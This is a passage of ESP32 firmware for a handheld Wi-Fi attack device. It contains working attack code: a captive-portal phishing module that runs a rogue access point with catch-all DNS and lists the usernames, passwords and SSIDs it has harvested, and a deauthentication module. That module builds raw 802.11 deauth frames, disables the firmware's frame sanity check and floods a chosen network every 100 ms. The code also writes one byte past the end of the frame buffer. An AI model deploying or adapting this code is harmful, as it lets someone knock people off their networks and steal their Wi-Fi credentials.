    for (int i = startIdx; i < min(count, startIdx + 18); i++) {
      Credential cred;
      EEPROM.get(CRED_ADDR + (i * CRED_SIZE), cred);
      Serial.printf("Credential %d at address %d: User=%s, Pass=%s, SSID=%s\n",
                    i, CRED_ADDR + (i * CRED_SIZE), cred.username, cred.password, cred.ssid);
                    
      tft.setTextColor(TFT_WHITE);
      tft.setCursor(0, yOffset);
      tft.println(cred.username);
      tft.setCursor(80, yOffset);
      tft.println(cred.password);
      tft.setCursor(160, yOffset);
      tft.println(cred.ssid);

      //tft.fillRect(225, yOffset - 3, 7, 7, TFT_RED);
      tft.setTextColor(TFT_RED);
      tft.setCursor(223, yOffset - 1);
      tft.println("X");

      yOffset += 10;
    }
  }

int buttonY = 290; 
tft.setTextColor(ORANGE); 
tft.setTextSize(1); 
tft.setTextDatum(MC_DATUM); 

tft.fillRoundRect(5, buttonY, 50, 20, 8, DARK_GRAY);
tft.drawRoundRect(5, buttonY, 50, 20, 8, ORANGE); 
tft.drawString("Back", 30, buttonY + 10);

tft.fillRoundRect(65, buttonY, 50, 20, 8, DARK_GRAY);
tft.drawRoundRect(65, buttonY, 50, 20, 8, ORANGE);
tft.drawString("Clear", 90, buttonY + 10);

tft.fillRoundRect(125, buttonY, 50, 20, 8, DARK_GRAY);
tft.drawRoundRect(125, buttonY, 50, 20, 8, ORANGE);
tft.drawString("Refr", 150, buttonY + 10);

if (credPage > 0) {
  tft.fillRoundRect(185, buttonY, 50, 20, 8, DARK_GRAY);
  tft.drawRoundRect(185, buttonY, 50, 20, 8, ORANGE);
  tft.drawString("Prev", 210, buttonY + 10);
} else if (count > (credPage + 1) * 15) {
  tft.fillRoundRect(185, buttonY, 50, 20, 8, DARK_GRAY);
  tft.drawRoundRect(185, buttonY, 50, 20, 8, ORANGE);
  tft.drawString("Next", 210, buttonY + 10);
}

}

void stopAttack() {
  if (attackActive) {
    WiFi.softAPdisconnect(true);
    Serial.println("Access Point stopped");
    displayPrint("Access Point stopped", GREEN, false);

    dnsServer.stop();
    Serial.println("DNS server stopped");
    displayPrint("DNS server stopped", GREEN, false);

    server.close();
    Serial.println("Web server stopped");
    displayPrint("Web server stopped", GREEN, false);

    attackActive = false;
    drawMainMenu();
  } else {
    Serial.println("Attack already inactive");
    displayPrint("Attack already inactive", GREEN, false);
  }
}

void startAttack() {
  if (!attackActive) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(custom_ssid, password);
    Serial.println("Access Point started");
    Serial.print("IP Address: ");
    Serial.println(WiFi.softAPIP());
    int ip = WiFi.softAPIP();
    displayPrint("Access Point started", GREEN, false);

    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    Serial.println("DNS server started");
    displayPrint("DNS server started", GREEN, false);

    setupWebServer();
    server.begin();
    Serial.println("Web server started");
    displayPrint("Web server started", GREEN, false);

    attackActive = true;
    drawMainMenu();
  } else {
    Serial.println("Attack already active");
    displayPrint("Attack already active", GREEN, false);
  }
}

void handleMainMenu(int x, int y) {}

void handleKeyboard(int x, int y) {
  int yOffset = 95;
  for (int row = 0; row < 4; row++) {
    int xOffset = 1;
    for (int col = 0; col < strlen(keyboardLayout[row]); col++) {
      if (x >= xOffset && x <= xOffset + keyWidth && y >= yOffset && y <= yOffset + keyHeight) {
        char c = keyboardLayout[row][col];
        Serial.printf("Key pressed: %c at x=%d, y=%d\n", c, x, y);
        tft.fillRect(xOffset, yOffset, keyWidth, keyHeight, ORANGE);
        tft.setTextColor(TFT_WHITE);
        tft.setTextSize(1);
        tft.setCursor(xOffset + 6, yOffset + 5);
        tft.print(c);
        delay(100);
        tft.fillRect(xOffset, yOffset, keyWidth, keyHeight, TFT_DARKGREY);
        tft.setTextColor(TFT_WHITE);
        tft.setCursor(xOffset + 6, yOffset + 5);
        tft.print(c);
        if (c == '<') {
          if (inputSSID.length() > 0) {
            inputSSID = inputSSID.substring(0, inputSSID.length() - 1);
          }
        } else if (c == '-') {
          inputSSID = "";
        } else if (c != ' ') {
          inputSSID += c;
        }
        drawInputField();
      }
      xOffset += keyWidth + keySpacing;
    }
    yOffset += keyHeight + keySpacing;
  }

  if (x >= 5 && x <= 75 && y >= 185 && y <= 210) {
    Serial.printf("Back button pressed at x=%d, y=%d\n", x, y);
    currentScreen = MAIN_MENU;
    keyboardActive = false;
    inputSSID = "";
    drawMainMenu();
  }

  if (x >= 85 && x <= 155 && y >= 185 && y <= 210) {
    Serial.printf("Series button pressed at x=%d, y=%d\n", x, y);
    inputSSID = seriesSSIDs[seriesSSIDIndex];
    seriesSSIDIndex = (seriesSSIDIndex + 1) % numSeriesSSIDs;
    drawInputField();
  }

  if (x >= 165 && x <= 235 && y >= 185 && y <= 210) {
    Serial.printf("OK button pressed at x=%d, y=%d\n", x, y);
    if (inputSSID.length() > 0) {
      saveSSID(inputSSID);
      currentScreen = MAIN_MENU;
      keyboardActive = false;
      drawMainMenu();
    } else {
      Serial.println("No SSID entered");
    }
  }
}

void handleCredList(int x, int y) {
  int count = EEPROM.read(COUNT_ADDR);
  int startIdx = credPage * 18;
  int yOffset = 80;

  for (int i = startIdx; i < min(count, startIdx + 18); i++) {
    if (x >= 220 && x <= 230 && y >= yOffset - 3 && y <= yOffset + 7) {
      Serial.println("Delete button pressed for credential " + String(i));
      deleteCredential(i);
      drawCredList();
      return;
    }
    yOffset += 10;
  }

  int buttonY = 290; // Match drawing code
  
  if (x >= 5 && x <= 55 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Back button pressed");
    currentScreen = MAIN_MENU;
    drawMainMenu();
  }
  if (x >= 65 && x <= 115 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Clear All button pressed");
    clearAllCredentials();
    credPage = 0;
    drawCredList();
  }
  if (x >= 125 && x <= 175 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Refresh button pressed");
    drawCredList();
  }
  if (credPage > 0 && x >= 185 && x <= 235 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Prev button pressed");
    credPage--;
    drawCredList();
  } else if (count > (credPage + 1) * 15 && x >= 185 && x <= 235 && y >= buttonY && y <= buttonY + 20) {
    Serial.println("Next button pressed");
    credPage++;
    drawCredList();
  }
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 5

  static int iconX[ICON_NUM] = {130, 160, 190, 220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_dialog,  
    bitmap_icon_list,     
    bitmap_icon_antenna,             
    bitmap_icon_power,
    bitmap_icon_go_back // Added back icon
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;  
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0: 
      break;

    case 1: 
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3: 
      switch (activeIcon) {
        case 0:
          currentScreen = KEYBOARD;
          keyboardActive = true;
          inputSSID = "";
          cursorState = false;
          lastCursorToggle = millis();
          drawKeyboard();
          animationState = 0;
          activeIcon = -1;
          break;
        case 1:
          currentScreen = CRED_LIST;
          credPage = 0;
          drawCredList();
          animationState = 0;
          activeIcon = -1;
          break;
        case 2:
          startAttack();
          animationState = 0;
          activeIcon = -1;
          break;
        case 3:
          stopAttack();
          animationState = 0;
          activeIcon = -1;
          break;

         case 4: // Back icon action (exit to submenu)
           feature_exit_requested = true;
           animationState = 0;
           activeIcon = -1;
          break;
      }
      break;

    case 4: break;
    case 5: break;
  }


  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;  

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

     if (currentScreen == KEYBOARD) {
      handleKeyboard(x, y);
    } else if (currentScreen == CRED_LIST) {
      handleCredList(x, y);
    } else {
      handleMainMenu(x, y);
    }

      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void cportalSetup() {

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);
  runUI();

  EEPROM.begin(EEPROM_SIZE);
  int count = EEPROM.read(COUNT_ADDR);
  if (count > MAX_CREDS || count < 0) {
    Serial.println("Invalid credential count, resetting to 0");
    EEPROM.write(COUNT_ADDR, 0);
    EEPROM.commit();
  }
  loadSSID();

  startAttack();
  stopAttack();

  drawMainMenu();
  setupTouchscreen();
}

void cportalLoop() {

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  updateStatusBar();
  runUI();
  
  if (attackActive) {
    dnsServer.processNextRequest();
    server.handleClient();
  }

  if (currentScreen == KEYBOARD) {
    unsigned long now = millis();
    if (now - lastCursorToggle >= 500) {
      cursorState = !cursorState;
      lastCursorToggle = now;
      drawInputField();
      }
    }
  }
} 


/*
 * 
 * 
 * Deauther
 * 
 * 
*/

namespace Deauther {

#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320

// Deauthentication frame template
uint8_t deauth_frame_default[26] = {
   /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
   /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
   /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
   /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
   /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
   /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
   /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};
uint8_t deauth_frame[sizeof(deauth_frame_default)];

uint32_t packet_count = 0;
uint32_t success_count = 0;
uint32_t consecutive_failures = 0;
bool attack_running = false;
wifi_ap_record_t selectedAp;
uint8_t selectedChannel;
int selected_ap_index = -1;
int network_count = 0;
wifi_ap_record_t *ap_list = nullptr;
bool scanning = false;
uint32_t last_packet_time = 0;
int current_page = 0; 
const int networks_per_page = 14; 

// Override Wi-Fi sanity check
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

// Send raw frame
void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    packet_count++;
    if (res == ESP_OK) {
        success_count++;
        consecutive_failures = 0;
    } else {
        consecutive_failures++;
        //Serial.printf("Deauth packet %d failed: %s, free heap: %u\n", packet_count, esp_err_to_name(res), ESP.getFreeHeap());
    }
}

// Send deauthentication frame
void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6); // Source: AP BSSID
    memcpy(&deauth_frame[16], ap_record->bssid, 6); // BSSID
    deauth_frame[26] = 7; // Reason code

    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
}

int compare_ap(const void *a, const void *b) {
    wifi_ap_record_t *ap1 = (wifi_ap_record_t *)a;
    wifi_ap_record_t *ap2 = (wifi_ap_record_t *)b;
    return ap2->rssi - ap1->rssi; // Descending order
}

void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
    uint16_t color = disabled ? DARK_GRAY : (highlight ? DARK_GRAY : ORANGE);
    tft.fillRect(x, y, w, h, color);
    tft.drawRect(x, y, w, h, WHITE); 
    tft.setTextColor(WHITE);
    tft.setTextSize(0); 

    int16_t textWidth = strlen(label) * 6; 
    int16_t textX = x + (w - textWidth) / 2;
    int16_t textY = y + (h - 6) / 2; 
    tft.setCursor(textX, textY);
    tft.println(label);
}

void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {
    tft.fillRect(0, 304, SCREEN_WIDTH, 16, DARK_GRAY);

    if (leftButton[0]) {
        drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
    }

    if (prevButton[0]) {
        drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
    }
    if (nextButton[0]) {
        drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
    }
}

void drawScanScreen() {
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.setTextSize(1);

    if (scanning) {
        tft.setCursor(10, 50);
        tft.setTextColor(GREEN);
        tft.println("Scanning...");
        loading(100, ORANGE, 0, 0, 3, true);
        tft.setCursor(10, 65);
        tft.println("Wait a moment.");
        return;
    }

    if (network_count == 0) {
        tft.setTextColor(GREEN);
        tft.setCursor(10, 50);
        tft.println("No networks found.");
        tft.setCursor(10, 65);
        tft.println("Press Rescan.");
    } else {
        int y = 50;
        tft.setTextColor(GREEN);
        tft.setCursor(10, y);
        tft.println("Networks:");
        y += 20;

        int start_index = current_page * networks_per_page;
        int end_index = min(start_index + networks_per_page, network_count);

        for (int i = start_index; i < end_index && y < 300; i++) {
            char buf[64];
            char ssid[12];
            strncpy(ssid, (char*)ap_list[i].ssid, 11);
            ssid[11] = '\0';
            if (strlen((char*)ap_list[i].ssid) > 11) strcat(ssid, "...");
            const char* enc = ap_list[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
            snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, ap_list[i].rssi, ap_list[i].primary, enc);
            tft.setCursor(10, y);
            tft.setTextColor(i == selected_ap_index ? ORANGE : (ap_list[i].authmode == WIFI_AUTH_OPEN ? ORANGE : WHITE));
            tft.println(buf);
            y += 15; 
        }

        char page_buf[20];
        snprintf(page_buf, sizeof(page_buf), "Page %d/%d", current_page + 1, (network_count + networks_per_page - 1) / networks_per_page);
        tft.setCursor(180, 50);
        tft.setTextColor(GREEN);
        tft.println(page_buf);
    }

    const char* leftButton = attack_running ? "Stop Attack" : "Rescan";
    bool leftDisabled = false; 
    const char* prevButton = "Prev";
    bool prevDisabled = attack_running || current_page == 0;
    const char* nextButton = "Next";
    bool nextDisabled = attack_running || (current_page + 1) * networks_per_page >= network_count;
    drawTabBar(leftButton, leftDisabled, prevButton, prevDisabled, nextButton, nextDisabled);
}

bool scanNetworks() {
    scanning = true;
    current_page = 0; 
    drawScanScreen();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    network_count = WiFi.scanNetworks();
    if (network_count == 0) {
        scanning = false;
        return false;
    }

    if (ap_list) free(ap_list);
    ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
    if (!ap_list) {
        scanning = false;
        return false;
    }

    for (int i = 0; i < network_count; i++) {
        wifi_ap_record_t ap_record = {0};
        memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
        strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
        ap_record.rssi = WiFi.RSSI(i);
        ap_record.primary = WiFi.channel(i);
        ap_record.authmode = WiFi.encryptionType(i);
        ap_list[i] = ap_record;
    }

    qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);

    scanning = false;
    return true;
}

bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; i++) {
        if (memcmp(WiFi.BSSID(i), bssid, 6) == 0) {
            *channel = WiFi.channel(i);
            WiFi.mode(WIFI_AP);
            delay(100);
            return true;
        }
    }

    WiFi.mode(WIFI_AP);
    delay(100);
    return false;
}

void resetWifi() {
    esp_wifi_stop();
    delay(200);
    esp_wifi_start();
    delay(200);
    packet_count = 0;
    success_count = 0;
    consecutive_failures = 0;
}

void drawAttackScreen() {
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.setTextSize(1);

    char buf[64];
    tft.setTextColor(WHITE);
    snprintf(buf, sizeof(buf), "Target: %s", selectedAp.ssid);
    tft.setCursor(10, 50);
    tft.println(buf);

    snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             selectedAp.bssid[0], selectedAp.bssid[1], selectedAp.bssid[2],
             selectedAp.bssid[3], selectedAp.bssid[4], selectedAp.bssid[5]);
    tft.setCursor(10, 70);
    tft.println(buf);

    const char* auth;
    switch (selectedAp.authmode) {
        case WIFI_AUTH_OPEN: auth = "OPEN"; break;
        case WIFI_AUTH_WPA_PSK: auth = "WPA-PSK"; break;
        case WIFI_AUTH_WPA2_PSK: auth = "WPA2-PSK"; break;
        case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2-PSK"; break;
        default: auth = "Unknown"; break;
    }
    snprintf(buf, sizeof(buf), "Auth: %s", auth);
    tft.setCursor(10, 85);
    tft.println(buf);

    tft.setCursor(10, 100);
    tft.setTextColor(attack_running ? ORANGE : DARK_GRAY);
    tft.println(attack_running ? "Status: Running" : "Status: Stopped");

    snprintf(buf, sizeof(buf), "Packets: %u", packet_count);
    tft.setCursor(10, 115);
    tft.setTextColor(WHITE);
    tft.println(buf);

    float success_rate = (packet_count > 0) ? (float)success_count / packet_count * 100 : 0;
    snprintf(buf, sizeof(buf), "Success: %.2f%%", success_rate);
    tft.setCursor(10, 130);
    tft.println(buf);

    snprintf(buf, sizeof(buf), "Heap: %u", ESP.getFreeHeap());
    tft.setCursor(10, 145);
    tft.println(buf);

    const char* buttons[] = {attack_running ? "Stop" : "Start", "Back"};
    drawTabBar(buttons[0], false, "", true, buttons[1], false); 
}

void handleTouch() {
    if (!ts.touched()) return;

    TS_Point p = ts.getPoint();
    
    int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
    int y = ::map(p.y, 3800, 300, 0, SCREEN_HEIGHT - 1);

    bool redraw = false;
    if (selected_ap_index == -1) {
        if (!scanning && y >= 60 && y < 270 && network_count > 0) {
            int index = (y - 60) / 15 + (current_page * networks_per_page); 
            if (index >= 0 && index < network_count) {
                selected_ap_index = index;
                selectedAp = ap_list[index];
                selectedChannel = ap_list[index].primary;
                drawScanScreen(); 
                delay(50); 
                drawAttackScreen();
            }
        } else if (!scanning && y >= 290 && y <= 320) {
            if (attack_running) {
                if (x >= 0 && x <= 57) {
                    drawButton(0, 304, 57, 16, "Stop Attack", true, false);
                    attack_running = false;
                    last_packet_time = 0;
                    drawScanScreen();
                    delay(50);
                    redraw = true;
                } else if (x >= 122 && x <= 179) {
                    drawButton(122, 304, 57, 16, "Rescan", true, false);
                    delay(50);
                    if (scanNetworks()) {
                        drawScanScreen();
                    }
                    redraw = true;
                } 
            } else {
                if (x >= 0 && x <= 57) {
                    drawButton(0, 304, 57, 16, "Rescan", true, false);
                    delay(50);
                    if (scanNetworks()) {
                        drawScanScreen();
                    }
                    redraw = true;
                } else if (x >= 122 && x <= 179) {
                    if (current_page > 0) {
                        drawButton(117, 304, 57, 16, "Prev", true, false);
                        current_page--;
                        drawScanScreen();
                        delay(50);
                        redraw = true;
                    } 
                } else if (x >= 183 && x <= 240) {
                    if ((current_page + 1) * networks_per_page < network_count) {
                        drawButton(178, 304, 57, 16, "Next", true, false);
                        current_page++;
                        drawScanScreen();
                        delay(50);
                        redraw = true;
                    } 
                }
            }
        }
    } else {
        if (y >= 290 && y <= 320) {
            if (x >= 0 && x <= 57) {
                drawButton(0, 304, 57, 16, attack_running ? "Stop" : "Start", true, false);
                attack_running = !attack_running;
                if (!attack_running) {
                    last_packet_time = 0;
                }
                drawAttackScreen();
                delay(50);
                redraw = true;
            } else if (x >= 183 && x <= 240) {
                drawButton(177, 304, 57, 16, "Back", true, false);
                attack_running = false;
                last_packet_time = 0;
                selected_ap_index = -1;
                drawScanScreen();
                delay(50);
                redraw = true;
            }
        }
    }

    if (redraw) {
        delay(100); 
    }
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {             
    bitmap_icon_undo,
    bitmap_icon_go_back // Added back icon
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;  
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0: 
      break;

    case 1: 
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3: 
      switch (activeIcon) {
        case 0:
          scanNetworks();
          delay(50);
          if (scanNetworks()) {
            drawScanScreen();
           }
          animationState = 0;
          activeIcon = -1;
          break;

         case 1: // Back icon action (exit to submenu)
           feature_exit_requested = true;
           animationState = 0;
           activeIcon = -1;
          break;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;  

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void deautherSetup() {

    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    
    setupTouchscreen();
    uiDrawn = false;
  
    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, false);
    runUI();

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    
    tft.setTextColor(GREEN, BLACK);
    tft.setTextSize(1);
    tft.setCursor(10, 50);
    tft.println("Initializing...");

    // Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    // Initialize Wi-Fi
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(82));
    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

    // Set up AP configuration
    wifi_config_t ap_config = {0};
    strncpy((char*)ap_config.ap.ssid, "ESP32DIV", sizeof(ap_config.ap.ssid));
    ap_config.ap.ssid_len = strlen("ESP32DIV");
    strncpy((char*)ap_config.ap.password, "deauth123", sizeof(ap_config.ap.password));
    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
    ap_config.ap.ssid_hidden = 0;
    ap_config.ap.max_connection = 4;
    ap_config.ap.beacon_interval = 100;
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));

    drawScanScreen();
}

void deautherLoop() {

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);

    handleTouch();
    updateStatusBar();
    runUI();

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);

    // Packet transmission
    uint32_t current_time = millis();
    if (attack_running && selected_ap_index != -1) {
        uint32_t heap = ESP.getFreeHeap();
        if (heap < 80000) {
            attack_running = false;
            last_packet_time = 0; // Reset packet timing
            drawAttackScreen();
            delay(3000);
            return;
        }

        if (consecutive_failures > 10) {
            resetWifi();
            last_packet_time = 0; // Reset packet timing
            delay(3000);
            return;
        }

        // Send packets at 100ms intervals, but check attack_running each time
        if (current_time - last_packet_time >= 100 && attack_running) {
            wsl_bypasser_send_deauth_frame(&selectedAp, selectedChannel);
            last_packet_time = current_time;
        }
    }

    static uint32_t last_channel_check = 0;
    if (attack_running && current_time - last_channel_check > 15000) { // Every 15s
        uint8_t new_channel;
        if (checkApChannel(selectedAp.bssid, &new_channel)) {
            if (new_channel != selectedChannel) {
                selectedChannel = new_channel;
                wifi_config_t ap_config = {0};
                strncpy((char*)ap_config.ap.ssid, "ESP32-DIV", sizeof(ap_config.ap.ssid));
                ap_config.ap.ssid_len = strlen("ESP32-DIV");
                strncpy((char*)ap_config.ap.password, "deauth123", sizeof(ap_config.ap.password));
                ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
                ap_config.ap.ssid_hidden = 0;
                ap_config.ap.max_connection = 4;
                ap_config.ap.beacon_interval = 100;
                ap_config.ap.channel = selectedChannel;
                ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
                //Serial.printf("Channel updated to %d\n", selectedChannel);
            }
        }
        last_channel_check = current_time;
    }

    static uint32_t last_status_time = 0;
    if (attack_running && current_time - last_status_time > 2000) { // Every 2s
        drawAttackScreen();
        last_status_time = current_time;
      }
  }
}


/*
 * 
 * 
 * Firmware Update
 * 
 * 
*/

namespace FirmwareUpdate {

#define SD_CS_PIN 5
#define FIRMWARE_FILE "/firmware.bin"

const char* host = "esp32";

#define SCREEN_WIDTH 240
#define SCREEN_HEIGHT 320

#define BUTTON_WIDTH 230
#define BUTTON_HEIGHT 20
#define BUTTON1_X 5
#define BUTTON1_Y 50
#define BUTTON2_X 5
#define BUTTON2_Y 80

#define TAB_BUTTON_WIDTH 57
#define TAB_BUTTON_HEIGHT 16
#define TAB_LEFT_X 0
#define TAB_MIDDLE_X 117
#define TAB_RIGHT_X 177
#define TAB_Y 304

#define TS_MIN_X 300
#define TS_MAX_X 3800
#define TS_MIN_Y 300
#define TS_MAX_Y 3800

#define NETWORKS_PER_PAGE 15
#define NETWORK_Y_START 70
#define NETWORK_ROW_HEIGHT 15

#define PASSWORD_MAX_LENGTH 32
#define KEY_WIDTH 20
#define KEY_HEIGHT 20
#define KEY_SPACING 2
#define KEYBOARD_Y_OFFSET_START 60

WebServer server(80);

char selectedSSID[32] = "";
char wifiPassword[PASSWORD_MAX_LENGTH + 1] = "";

typedef struct {
  char ssid[32];
  int8_t rssi;
  uint8_t channel;
  uint8_t authmode;
} NetworkInfo;

const char* keyboardLayout[] = {
  "1234567890",
  "QWERTYUIOP",
  "ASDFGHJKL",
  "ZXCVBNM!@#"
};

void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled);
